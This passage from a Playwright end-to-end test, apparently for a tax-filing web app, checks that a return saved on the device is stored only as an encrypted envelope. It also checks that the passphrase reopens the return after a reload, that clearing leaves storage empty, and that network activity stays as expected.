    await openDeviceData(page);
    await importSaveFile(page);

    await page.locator(`#device-passphrase`).fill(PASSPHRASE);
    await page.getByRole(`button`, { name: t.device.saveButton }).click();
    await statusShows(page, t.device.saved);

    const assertOnlyEnvelope = async () => {
      const stored = await snapshotStorage(context, page);
      expect({ ...stored, localStorage: [] }).toEqual(EMPTY);
      expect(stored.localStorage.map(([k]) => k)).toEqual([DEVICE_SAVE_KEY]);
      const value = stored.localStorage[0][1];
      await assertEncryptedEnvelope(value, [FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages]);
      expect(findMarkers(value)).toEqual([]);
      expect(value).not.toContain(PASSPHRASE);
      expect(findMarkers(JSON.stringify(stored))).toEqual([]);
    };
    await assertOnlyEnvelope();

    // A reload drops the in-memory return but keeps the encrypted copy, which the passphrase opens again.
    await page.reload();
    await page.goto(`${site.origin}/df/file/home`);
    await assertOnlyEnvelope();
    await startReturn(page);
    await openDeviceData(page);
    await page.locator(`#device-passphrase`).fill(PASSPHRASE);
    await page.getByRole(`button`, { name: t.device.loadButton }).click();
    await statusShows(page, t.device.loaded);
    expect(findMarkers(await exportPlaintext(page))).toEqual(
      expect.arrayContaining([FILE.firstName, FILE.lastName, TIN_JSON, FILE.wages])
    );

    await page.getByRole(`button`, { name: t.clear.button }).click();
    await statusShows(page, t.clear.done);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);
    await page.reload();
    await page.goto(`${site.origin}/df/file/home`);
    expect(await snapshotStorage(context, page)).toEqual(EMPTY);

    await assertNetwork(recorded, aborted, webSockets);
    await context.close();
  }, 180_000);
});
